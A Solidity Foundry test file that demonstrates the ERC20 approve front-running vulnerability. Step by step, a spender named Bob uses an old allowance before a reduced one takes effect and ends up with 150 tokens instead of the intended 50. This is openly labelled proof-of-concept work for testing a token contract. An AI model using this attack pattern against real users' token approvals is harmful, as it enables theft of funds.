// SPDX-License-Identifier: MIT
pragma solidity ^0.8.31;

import {Test} from "forge-std/Test.sol";
import {ERC20} from "src/ERC20.sol";

/**
 * @title ApproveFrontRunTest
 * @notice Demonstrates the approve front-running attack vulnerability
 * @dev This test shows how an attacker can drain more tokens than intended
 *      by front-running an approve transaction
 */
contract ApproveFrontRunTest is Test {
    ERC20 public token;
    address public alice = address(0x1);
    address public bob = address(0x2);

    function setUp() public {
        token = new ERC20("Test Token", "TEST");
        // Mint 1000 tokens to Alice
        token.mint(alice, 1000 * 10 ** 18);
    }

    /**
     * @notice Attack Scenario:
     * 1. Alice approves Bob for 100 tokens
     * 2. Alice wants to reduce approval to 50, so she submits tx: approve Bob for 50
     * 3. Bob front-runs and calls transferFrom for 100 (using the old approval)
     * 4. Alice's tx finalizes (approve 50)
     * 5. Bob calls transferFrom again for 50
     * 6. Bob drained 150 total instead of the intended 50
     */
    function test_ApproveFrontRun_Attack() public {
        uint256 initialAmount = 100 * 10 ** 18;
        uint256 reducedAmount = 50 * 10 ** 18;

        // Step 1: Alice approves Bob for 100 tokens
        vm.prank(alice);
        token.approve(bob, initialAmount);
        assertEq(token.allowance(alice, bob), initialAmount);

        // Step 2: Alice wants to reduce approval to 50
        // In reality: Alice submits a transaction to approve Bob for 50 (tx is pending in mempool)
        // Bob monitors the mempool and sees Alice's pending transaction...

        // Step 3: Bob front-runs Alice's pending transaction
        // Bob submits his transaction with higher gas to execute first
        // Bob calls transferFrom for 100 tokens (using the current approval of 100)
        vm.prank(bob);
        token.transferFrom(alice, bob, initialAmount);

        // Verify Bob received 100 tokens
        assertEq(token.balanceOf(bob), initialAmount);
        assertEq(token.balanceOf(alice), 1000 * 10 ** 18 - initialAmount);
        assertEq(token.allowance(alice, bob), 0); // Allowance was consumed

        // Step 4: Alice's transaction finalizes (approve 50)
        vm.prank(alice);
        token.approve(bob, reducedAmount);
        assertEq(token.allowance(alice, bob), reducedAmount);

        // Step 5: Bob calls transferFrom again for 50 tokens
        vm.prank(bob);
        token.transferFrom(alice, bob, reducedAmount);

        // Step 6: Bob has drained 150 total instead of the intended 50
        uint256 bobTotal = token.balanceOf(bob);
        uint256 expectedDrain = initialAmount + reducedAmount; // 100 + 50 = 150

        assertEq(bobTotal, expectedDrain, "Bob drained more than intended!");
        assertEq(
            token.balanceOf(alice),
            1000 * 10 ** 18 - expectedDrain,
            "Alice lost more tokens than intended!"
        );
        assertEq(token.allowance(alice, bob), 0);
    }
}
